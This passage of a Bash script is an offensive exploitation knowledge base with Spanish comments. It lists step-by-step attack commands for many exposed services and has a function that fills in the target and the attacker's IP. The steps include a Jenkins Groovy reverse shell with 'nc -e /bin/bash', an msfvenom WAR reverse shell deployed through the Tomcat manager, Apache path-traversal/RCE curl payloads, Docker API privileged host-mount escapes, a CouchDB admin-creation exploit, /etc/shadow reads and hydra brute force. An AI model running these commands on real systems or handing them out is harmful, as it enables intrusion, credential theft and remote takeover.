  CVE-2017-12794 | Express template injection
"

# ------------------------------------------------------------
# IIS
# ------------------------------------------------------------
SVC_DESCRIPTION[iis]="Microsoft Internet Information Services"
SVC_DIFFICULTY[iis]="Media"
SVC_TOOLS[iis]="gobuster nikto whatweb curl nmap"
SVC_STEPS[iis]="
PASO 1 - RECON:
  whatweb TARGET
  curl -I http://TARGET
  # Mira: Server: Microsoft-IIS/10.0

PASO 2 - FUZZING:
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,php,config,bak
  nikto -h http://TARGET

PASO 3 - IIS ESPECIFICO:
  nmap --script http-iis-short-name-brute -p PORT TARGET
  nmap --script http-webdav-scan -p PORT TARGET
  # Short name brute force revela archivos .config, .aspx

PASO 4 - WEBDAV:
  # Si WebDAV habilitado:
  curl -X PUT http://TARGET/test.txt -d 'hacked'
  # Puedes subir archivos al servidor

PASO 5 - LOG POISONING:
  # Si tienes acceso a log (via LFI o FTP):
  # Escribe PHP/ASP en el log y accede via LFI
"
SVC_VULNS[iis]="
  CVE-2021-31166 | HTTP.sys RCE
  CVE-2017-7269  | WebDAV buffer overflow
  IIS shortname disclosure
  WebDAV habilitado permite upload
  HTTP verb tampering
  NTLM hash capture
"

# ------------------------------------------------------------
# APACHE
# ------------------------------------------------------------
SVC_DESCRIPTION[apache]="Apache HTTP Server"
SVC_DIFFICULTY[apache]="Facil-Media"
SVC_TOOLS[apache]="gobuster nikto whatweb curl nmap"
SVC_STEPS[apache]="
PASO 1 - RECON:
  whatweb TARGET
  curl -I http://TARGET
  # Server: Apache/2.4.41

PASO 2 - FUZZING:
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
  nikto -h http://TARGET

PASO 3 - APACHE ESPECIFICO:
  curl http://TARGET/.htaccess
  curl http://TARGET/server-status
  curl http://TARGET/server-info
  nmap --script http-methods -p PORT TARGET

PASO 4 - VULNS:
  # CVE-2021-41773: Path traversal
  curl http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
  # CVE-2021-42013: RCE
  curl http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
"
SVC_VULNS[apache]="
  CVE-2021-41773 | Path traversal < 2.4.50
  CVE-2021-42013 | RCE < 2.4.51
  CVE-2017-9798  | Optionsbleed
  Directory listing habilitado
  .htaccess expuesto
"

# ------------------------------------------------------------
# NGINX
# ------------------------------------------------------------
SVC_DESCRIPTION[nginx]="Nginx Web Server"
SVC_DIFFICULTY[nginx]="Facil-Media"
SVC_TOOLS[nginx]="gobuster nikto curl"
SVC_STEPS[nginx]="
PASO 1 - RECON:
  curl -I http://TARGET
  # Server: nginx/1.18.0

PASO 2 - FUZZING:
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
  nikto -h http://TARGET

PASO 3 - NGINX ESPECIFICO:
  # Path traversal via alias:
  curl http://TARGET/static../etc/passwd
  # Misconfigured proxy_pass
  # HTTP request smuggling
"
SVC_VULNS[nginx]="
  CVE-2021-23017 | DNS resolver off-by-one < 1.21.3
  CVE-2019-20372 | HTTP request smuggling
  Alias misconfiguration = path traversal
  CRLF injection
"

# ------------------------------------------------------------
# TOMCAT
# ------------------------------------------------------------
SVC_DESCRIPTION[tomcat]="Apache Tomcat - Servidor de aplicaciones Java"
SVC_DIFFICULTY[tomcat]="Facil"
SVC_TOOLS[tomcat]="gobuster msfconsole curl hydra"
SVC_STEPS[tomcat]="
PASO 1 - MANAGER PANEL:
  curl -I http://TARGET:8080/manager/html
  # Si responde 401 = panel existe, intenta credenciales

PASO 2 - CREDS POR DEFECTO:
  curl -u 'tomcat:tomcat' http://TARGET:8080/manager/html
  curl -u 'admin:admin' http://TARGET:8080/manager/html
  curl -u 'tomcat:s3cret' http://TARGET:8080/manager/html
  curl -u 'admin:password' http://TARGET:8080/manager/html

PASO 3 - BRUTE FORCE:
  hydra -l tomcat -P /usr/share/wordlists/rockyou.txt http-get://TARGET:8080/manager/html

PASO 4 - UPLOAD WAR SHELL:
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war
  # Deploy via manager:
  curl -u 'tomcat:password' --upload-file shell.war 'http://TARGET:8080/manager/text/deploy?path=/shell'
  # Accede: http://TARGET:8080/shell/

PASO 5 - GHOSTCAT (AJP):
  # Si AJP habilitado (puerto 8009):
  # nmap --script http-vuln-cve2020-1938 -p 8009 TARGET
  # exploit: Lector de archivos via AJP
"
SVC_VULNS[tomcat]="
  CVE-2020-1938 | Ghostcat - AJP file read/RCE
  CVE-2019-0232 | RCE via CGI
  Tomcat Manager default credentials
  Manager panel expuesto a internet
"

# ------------------------------------------------------------
# JENKINS
# ------------------------------------------------------------
SVC_DESCRIPTION[jenkins]="Jenkins - CI/CD Server"
SVC_DIFFICULTY[jenkins]="Facil-Media"
SVC_TOOLS[jenkins]="gobuster curl hydra metasploit"
SVC_STEPS[jenkins]="
PASO 1 - RECON:
  curl -I http://TARGET:8080/
  curl http://TARGET:8080/api/json
  # API puede estar sin autenticar

PASO 2 - SCRIPT CONSOLE (RCE):
  curl http://TARGET:8080/script
  # Si pide login, brute force:
  hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET:8080/script

PASO 3 - SI ACCESO AL SCRIPT CONSOLE:
  # Groovy RCE:
  def proc = 'id'.execute()
  println proc.text
  # Reverse shell:
  def proc = 'bash -c {echo,YOUR_IP|base64,-d}|{bash,-i}|{tcp,YOUR_IP,4444}<&2 2>&1|{nc,-e,/bin/bash,YOUR_IP,4444}'.execute()

PASO 4 - ENUMERACION:
  curl http://TARGET:8080/asynchPeople/api/json
  curl http://TARGET:8080/job/<job>/config.xml
  # Config puede contener credenciales
"
SVC_VULNS[jenkins]="
  CVE-2024-23897 | Arbitrary file read
  CVE-2019-1003000 | Script Security sandbox bypass
  Script Console sin autenticar = RCE
  Pipeline script injection
  Credentials in config.xml
"

# ------------------------------------------------------------
# DOCKER
# ------------------------------------------------------------
SVC_DESCRIPTION[docker]="Docker API"
SVC_DIFFICULTY[docker]="Facil"
SVC_TOOLS[docker]="curl nmap"
SVC_STEPS[docker]="
PASO 1 - CHECK API:
  curl http://TARGET:2375/version
  curl http://TARGET:2376/version
  # Si responde = API expuesta

PASO 2 - ENUMERACION:
  curl http://TARGET:2375/containers/json
  curl http://TARGET:2375/images/json
  curl http://TARGET:2375/info

PASO 3 - RCE VIA CONTAINER:
  # Crear container con mount al host:
  curl -X POST http://TARGET:2375/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'
  # Start container, exec con /host al filesystem host
"
SVC_VULNS[docker]="
  Docker API sin autenticar = RCE
  Container escape via privileged mode
  CVE-2019-5736 | runc container escape
"

# ------------------------------------------------------------
# KUBERNETES
# ------------------------------------------------------------
SVC_DESCRIPTION[kubernetes]="Kubernetes API Server"
SVC_DIFFICULTY[kubernetes]="Media"
SVC_TOOLS[kubernetes]="curl kubectl nmap"
SVC_STEPS[kubernetes]="
PASO 1 - CHECK API:
  curl -k https://TARGET:6443/version
  curl -k https://TARGET:6443/api/v1/namespaces
  curl -k https://TARGET:6443/api/v1/pods

PASO 2 - ENUMERACION:
  curl -k https://TARGET:6443/api/v1/secrets
  curl -k https://TARGET:6443/api/v1/namespaces/default/pods
"
SVC_VULNS[kubernetes]="
  Kubernetes API sin autenticar
  Secrets expuestos
  etcd expuesto sin auth
  Container escape
"

# ============================================================
# ELASTICSEARCH
# ============================================================
SVC_DESCRIPTION[elasticsearch]="Elasticsearch - Motor de busqueda y analytics"
SVC_DIFFICULTY[elasticsearch]="Facil"
SVC_TOOLS[elasticsearch]="curl nmap"
SVC_STEPS[elasticsearch]="
PASO 1 - ENUMERACION:
  curl http://TARGET:9200/
  curl http://TARGET:9200/_cat/indices
  curl http://TARGET:9200/_cat/nodes
  curl http://TARGET:9200/_cat/shards
  # Detecta: version, indices, nodos

PASO 2 - DUMP DE INDICES:
  curl http://TARGET:9200/_search?size=1000
  curl http://TARGET:9200/INDEX/_search?size=100
  # Busca: usuarios, passwords, tokens

PASO 3 - OFFENSIVE:
  # Si hay un index con datos sensibles:
  curl http://TARGET:9200/INDEX/_search?q=*
  # CVE-2014-3120: Scripting habilitado
  curl -XPOST 'http://TARGET:9200/_search' -d '{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}},\"script\":{\"script\":\"import java.io.*;new Scanner(new File(\\\"/etc/passwd\\\")).useDelimiter(\\\"\\\\\\\\Z\\\").next()\"}}}'
"
SVC_VULNS[elasticsearch]="
  CVE-2014-3120  | MVEL script RCE | Elasticsearch < 1.2.1
  CVE-2015-1427  | Groovy script RCE | Elasticsearch 1.1.x - 1.4.x
  CVE-2021-22145 | Network information leak | Elasticsearch < 7.14.0
  Sin autenticacion por defecto = acceso total a indices
  Datos sensibles expuestos sin credenciales
"

# ============================================================
# DOCKER REGISTRY
# ============================================================
SVC_DESCRIPTION[docker_registry]="Docker Registry - Repositorio de imagenes Docker"
SVC_DIFFICULTY[docker_registry]="Facil"
SVC_TOOLS[docker_registry]="curl docker nmap"
SVC_STEPS[docker_registry]="
PASO 1 - CHECK API:
  curl http://TARGET:5000/v2/_catalog
  # Si responde: {\"repositories\": [...]} = registry expuesto

PASO 2 - LISTAR IMAGENES:
  curl http://TARGET:5000/v2/_catalog
  curl http://TARGET:5000/v2/IMAGENAME/tags/list

PASO 3 - PULL IMAGENES:
  docker pull TARGET:5000/IMAGENAME:TAG
  # Si pide auth, prueba credenciales por defecto

PASO 4 - OFFENSIVE:
  # Busca: secrets, configs, credenciales en las imagenes
  docker run --rm -it TARGET:5000/IMAGENAME cat /etc/passwd
  docker run --rm -it -v /:/mnt TARGET:5000/IMAGENAME cat /mnt/etc/shadow
"
SVC_VULNS[docker_registry]="
  Registry sin autenticacion = acceso total a imagenes
  Imagenes pueden contener secrets y credenciales
  CVE-2017-11499 | Docker Registry API access control bypass
  Posible push de imagenes maliciosas
"

# ============================================================
# RABBITMQ
# ============================================================
SVC_DESCRIPTION[rabbitmq]="RabbitMQ - Message broker AMQP"
SVC_DIFFICULTY[rabbitmq]="Facil"
SVC_TOOLS[rabbitmq]="curl nmap hydra"
SVC_STEPS[rabbitmq]="
PASO 1 - MANAGEMENT UI:
  curl -u guest:guest http://TARGET:15672/api/overview
  # Management UI en puerto 15672
  # Creds default: guest:guest

PASO 2 - ENUMERACION:
  curl -u guest:guest http://TARGET:15672/api/queues
  curl -u guest:guest http://TARGET:15672/api/exchanges
  curl -u guest:guest http://TARGET:15672/api/connections
  curl -u guest:guest http://TARGET:15672/api/users

PASO 3 - BRUTE FORCE:
  hydra -l guest -P /usr/share/wordlists/rockyou.txt http-get://TARGET:15672/api/ -t 4

PASO 4 - OFFENSIVE:
  # Si tienes acceso: publica/consume mensajes
  # Busca: credenciales, tokens en los mensajes
  # Puedes crear usuarios con permisos admin
"
SVC_VULNS[rabbitmq]="
  guest:guest habilitado por defecto en versiones viejas
  Management UI expuesto a internet
  Mensajes pueden contener credenciales sensibles
  CVE-2019-11489 | RabbitMQ management UI DoS
  CVE-2022-24112 | Authentication bypass via XML external entity
"

# ============================================================
# MONGODB (actualizado)
# ============================================================

# ============================================================
# COUCHDB
# ============================================================
SVC_DESCRIPTION[couchdb]="Apache CouchDB - Base de datos NoSQL"
SVC_DIFFICULTY[couchdb]="Facil"
SVC_TOOLS[couchdb]="curl nmap"
SVC_STEPS[couchdb]="
PASO 1 - CHECK API:
  curl http://TARGET:5984/
  curl http://TARGET:5984/_all_dbs
  curl http://TARGET:5984/_users
  # Si responde = no tiene auth

PASO 2 - ENUMERACION:
  curl http://TARGET:5984/_all_dbs
  curl http://TARGET:5984/DBNAME/_all_docs?include_docs=true
  curl http://TARGET:5984/_users/_all_docs?include_docs=true

PASO 3 - OFFENSIVE:
  # Busca: usuarios, credenciales en _users
  curl http://TARGET:5984/_users/_all_docs?include_docs=true | grep -i pass
  # Fauxton UI: http://TARGET:5984/_utils/

PASO 4 - CVE-2017-12635:
  # JSON parsing bypass para crear admin
  curl -X PUT http://TARGET:5984/_users/org.couchdb.user:pwned -H 'Content-Type: application/json' -d '{\"type\":\"user\",\"name\":\"pwned\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"pwned\"}'
"
SVC_VULNS[couchdb]="
  CVE-2017-12635 | JSON object multiple keys RCE | CouchDB < 2.1.1
  CVE-2017-12636 | Config section exec | CouchDB < 2.1.1
  CVE-2022-24706 | Erlang cookie RCE | CouchDB < 3.2.2
  Sin autenticacion por defecto en versiones viejas
  Fauxton UI expuesto
"

# ============================================================
# MINIO
# ============================================================
SVC_DESCRIPTION[minio]="MinIO - Object storage compatible con S3"
SVC_DIFFICULTY[minio]="Facil"
SVC_TOOLS[minio]="curl mc nmap"
SVC_STEPS[minio]="
PASO 1 - CHECK:
  curl http://TARGET:9001/
  curl http://TARGET:9000/minio/health/live
  # Console UI: puerto 9001

PASO 2 - CREDS POR DEFECTO:
  # minioadmin:minioadmin (default)
  curl -u minioadmin:minioadmin http://TARGET:9001/api/v1/buckets
  curl -u minioadmin:minioadmin http://TARGET:9000/

PASO 3 - BRUTE FORCE:
  hydra -l minioadmin -P /usr/share/wordlists/rockyou.txt http-get://TARGET:9001/ -t 4

PASO 4 - OFFENSIVE:
  # Configurar mc (MinIO Client):
  mc alias set myminio http://TARGET:9000 minioadmin minioadmin
  mc ls myminio/
  mc cat myminio/BUCKET/file
"
SVC_VULNS[minio]="
  minioadmin:minioadmin credenciales por defecto
  Console UI expuesto sin auth
  Datos S3 accesibles sin autenticacion
  CVE-2023-28432 | Information disclosure via environment variable
"

# ============================================================
# GRAFANA
# ============================================================
SVC_DESCRIPTION[grafana]="Grafana - Plataforma de observabilidad"
SVC_DIFFICULTY[grafana]="Facil"
SVC_TOOLS[grafana]="curl nmap hydra"
SVC_STEPS[grafana]="
PASO 1 - CHECK:
  curl http://TARGET:3000/api/health
  curl http://TARGET:3000/login
  # Login page

PASO 2 - CREDS POR DEFECTO:
  # admin:admin (versiones viejas)
  curl -u admin:admin http://TARGET:3000/api/org
  curl -u admin:admin http://TARGET:3000/api/datasources

PASO 3 - BRUTE FORCE:
  hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET:3000/login -t 4

PASO 4 - OFFENSIVE:
  # Si tienes acceso:
  # - Busca datasources (puede tener credenciales de DBs)
  # - Busca dashboards con querys SQL
  # - Exporta los datasources
  curl -u admin:admin http://TARGET:3000/api/datasources
  curl -u admin:admin http://TARGET:3000/api/search
"
SVC_VULNS[grafana]="
  admin:admin default en versiones < 7.0
  CVE-2021-43798 | Path traversal | Grafana < 8.3.0
  CVE-2020-13379 | File read | Grafana < 6.7.4
  CVE-2023-4822 | Account takeover via dashboard sharing
  Datasources pueden exponer credenciales de DBs
"

# ============================================================
# GITLAB
# ============================================================
SVC_DESCRIPTION[gitlab]="GitLab - Plataforma DevOps"
SVC_DIFFICULTY[gitlab]="Media"
SVC_TOOLS[gitlab]="curl nmap hydra git"
SVC_STEPS[gitlab]="
PASO 1 - CHECK:
  curl -I http://TARGET:443/
  curl http://TARGET:443/api/v4/version
  # Detecta version

PASO 2 - ENUMERACION:
  curl http://TARGET:443/api/v4/projects
  curl http://TARGET:443/api/v4/users
  curl http://TARGET:443/api/v4/groups
  # Puede estar sin auth en versiones viejas

PASO 3 - BRUTE FORCE:
  hydra -l root -P /usr/share/wordlists/rockyou.txt https-post-form://TARGET:443/users/sign_in:username=root&password=^PASS^&commit=Sign+in -t 4

PASO 4 - OFFENSIVE:
  # Si tienes acceso:
  # - Clona repos privados
  # - Busca .git, secrets, credenciales en commits
  # - Busca CI/CD pipelines con credenciales
  git clone http://user:pass@TARGET/repo.git
"
SVC_VULNS[gitlab]="
  CVE-2021-22214 | CI/CD pipeline secrets exposure
  CVE-2022-2884 | Account takeover via OAuth
  CVE-2023-7028 | Password reset account takeover
  CVE-2024-4835 | Project access token exposure
  Repos pueden contener secrets y credenciales
"

# ============================================================
# ETCD
# ============================================================
SVC_DESCRIPTION[etcd]="etcd - Distributed key-value store"
SVC_DIFFICULTY[etcd]="Facil"
SVC_TOOLS[etcd]="curl nmap"
SVC_STEPS[etcd]="
PASO 1 - CHECK:
  curl http://TARGET:2379/v2/keys/
  curl http://TARGET:2379/v3/kv/range -X POST -d '{\"key\":\"AA==\"}'
  # Sin auth por defecto

PASO 2 - ENUMERACION:
  curl http://TARGET:2379/v2/keys/?recursive=true
  # Dump de todos los keys

PASO 3 - OFFENSIVE:
  # Busca: tokens, secrets, passwords en los keys
  curl http://TARGET:2379/v2/keys/?recursive=true | jq .
  # Si es Kubernetes: contiene secrets de todo el cluster
"
SVC_VULNS[etcd]="
  Sin autenticacion por defecto
  Datos sensibles: tokens, passwords, secrets de K8s
  CVE-2020-15114 | Bans peers via large payloads
  CVE-2020-15136 | gRPC gateway authentication bypass
  Expone config de todo el cluster
"

# ============================================================
# CONSUL
# ============================================================
SVC_DESCRIPTION[consul]="HashiCorp Consul - Service mesh"
SVC_DIFFICULTY[consul]="Facil"
SVC_TOOLS[consul]="curl nmap"
SVC_STEPS[consul]="
PASO 1 - CHECK:
  curl http://TARGET:8500/v1/catalog/services
  curl http://TARGET:8500/v1/agent/self
  curl http://TARGET:8500/ui/

PASO 2 - ENUMERACION:
  curl http://TARGET:8500/v1/catalog/services
  curl http://TARGET:8500/v1/catalog/nodes
  curl http://TARGET:8500/v1/kv/?keys
  # KV store puede tener secrets

PASO 3 - OFFENSIVE:
  # Si KV tiene secrets:
  curl http://TARGET:8500/v1/kv/KEY?raw
  # Services internos descubiertos
  curl http://TARGET:8500/v1/catalog/service/SERVICE_NAME
"
SVC_VULNS[consul]="
  Sin autenticacion por defecto
  KV store con secrets expuestos
  CVE-2021-32559 | RPC over TCP unauthenticated
  Service catalog information disclosure
  ACL policy bypass
"

# ============================================================
# VAULT
# ============================================================
SVC_DESCRIPTION[vault]="HashiCorp Vault - Secrets management"
SVC_DIFFICULTY[vault]="Media"
SVC_TOOLS[vault]="curl nmap"
SVC_STEPS[vault]="
PASO 1 - CHECK:
  curl http://TARGET:8200/v1/sys/health
  curl http://TARGET:8200/v1/sys/seal-status
  curl http://TARGET:8200/ui/

PASO 2 - ENUMERACION:
  # Si hay token:
  curl -H 'X-Vault-Token: TOKEN' http://TARGET:8200/v1/sys/mounts
  curl -H 'X-Vault-Token: TOKEN' http://TARGET:8200/v1/secret/data?list=true

PASO 3 - OFFENSIVE:
  # Busca tokens en archivos del sistema
  grep -r 's\.' /var/www/ 2>/dev/null  # Vault tokens empiezan con s.
  # Unseal keys y root token son objetivos
"
SVC_VULNS[vault]="
  Unseal keys = acceso total a secrets
  Token leak en logs o archivos
  CVE-2021-32923 | Vault Enterprise vulnerabilities
  CVE-2023-0620 | Vault Enterprise OIDC identity provider bypass
"

# ============================================================
# MOSQUITTO (MQTT)
# ============================================================
SVC_DESCRIPTION[mosquitto]="Eclipse Mosquitto - MQTT Broker"
SVC_DIFFICULTY[mosquitto]="Facil"
SVC_TOOLS[mosquitto]="nmap mosquitto_sub mosquitto_pub"
SVC_STEPS[mosquitto]="
PASO 1 - TEST AUTH:
  mosquitto_sub -h TARGET -t '#' -v -C 1
  # Si suscribe = no tiene auth

PASO 2 - ENUMERACION:
  mosquitto_sub -h TARGET -t '#' -v
  # Escucha todos los topics

PASO 3 - OFFENSIVE:
  # MQTT puede tener: IoT data, comandos, credenciales
  mosquitto_pub -h TARGET -t 'topic' -m 'payload'
  # Si hay topics de control: envia comandos
"
SVC_VULNS[mosquitto]="
  Mosquitto 1.x: sin auth por defecto
  Topics pueden contener credenciales y datos sensibles
  IoT devices control via MQTT
  CVE-2017-7650 | DoS via crafted SUBSCRIBE packet
"

# ============================================================
# FUNCION: Obtener info de un servicio
# ============================================================
get_service_info() {
    local svc="$1"
    local target="$2"
    local port="$3"

    # Normalizar servicio
    local svc_lower=$(echo "$svc" | tr '[:upper:]' '[:lower:]')
    local target_svc="$svc_lower"

    # Mapeos de aliases
    case "$svc_lower" in
        microsoft-ds|netbios-ssn) target_svc="smb" ;;
        "ms-wbt-server") target_svc="rdp" ;;
        "ms-sql-s"|"ms-sql-m") target_svc="mssql" ;;
        "https-alt") target_svc="https" ;;
    esac

    # Buscar en el knowledge base
    if [ -n "${SVC_DESCRIPTION[$target_svc]+x}" ]; then
        echo "SERVICIO: ${svc^^}"
        echo "DESCRIPCION: ${SVC_DESCRIPTION[$target_svc]}"
        echo "DIFICULTAD: ${SVC_DIFFICULTY[$target_svc]}"
        echo "HERRAMIENTAS: ${SVC_TOOLS[$target_svc]}"
        echo ""
        echo "=== PASOS PARA EXPLOTAR ==="
        echo "${SVC_STEPS[$target_svc]}" | sed "s/TARGET/$target/g; s/PORT/$port/g; s/YOUR_IP/$(hostname -I | awk '{print $1}')/g"
        echo ""
        echo "=== VULNERABILIDADES CONOCIDAS ==="
        echo "${SVC_VULNS[$target_svc]}"
        return 0
    fi
    return 1
}
